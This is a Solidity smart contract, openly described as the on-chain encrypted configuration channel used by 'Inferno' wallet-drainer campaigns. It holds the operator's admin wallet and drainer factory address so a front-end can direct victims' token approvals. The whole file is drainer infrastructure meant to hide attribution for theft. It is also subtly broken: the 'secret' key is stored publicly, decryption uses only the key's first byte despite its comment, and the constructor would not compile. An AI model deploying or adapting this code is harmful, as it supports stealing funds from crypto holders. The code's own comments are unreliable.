// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title CommandChannel
 * @notice The "encrypted config stored in the blockchain" trick from real
 *         Inferno campaigns. The operator's config (admin wallet, drainer
 *         factory address, flags) is XOR-encrypted with a key and stored in
 *         a public byte array. Anyone can read the blob, but only the
 *         front-end that knows the key can decrypt it and know where to
 *         point the victim's approvals.
 *
 *         This is obfuscation, not security: it raises the bar for
 *         attribution and lets the operator rotate the admin key by
 *         deploying a new channel.
 */
contract CommandChannel {
    address public owner;
    bytes public encryptedConfig;
    bytes32 public key;
    bool public active;

    event ConfigUpdated(bytes newEncryptedConfig, bytes32 newKey);
    event Deactivated();

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(bytes _encryptedConfig, bytes32 _key) {
        owner = msg.sender;
        encryptedConfig = _encryptedConfig;
        key = _key;
        active = true;
    }

    function updateConfig(bytes calldata _encryptedConfig, bytes32 _key) external onlyOwner {
        encryptedConfig = _encryptedConfig;
        key = _key;
        emit ConfigUpdated(_encryptedConfig, _key);
    }

    function deactivate() external onlyOwner {
        active = false;
        emit Deactivated();
    }

    /// @notice Anyone can decrypt: XOR each byte with the repeating key.
    function decryptConfig() external view returns (bytes memory) {
        bytes memory enc = encryptedConfig;
        bytes32 k = key;
        bytes memory out = new bytes(enc.length);
        for (uint256 i = 0; i < enc.length; i++) {
            out[i] = enc[i] ^ bytes1(k);
        }
        return out;
    }
}
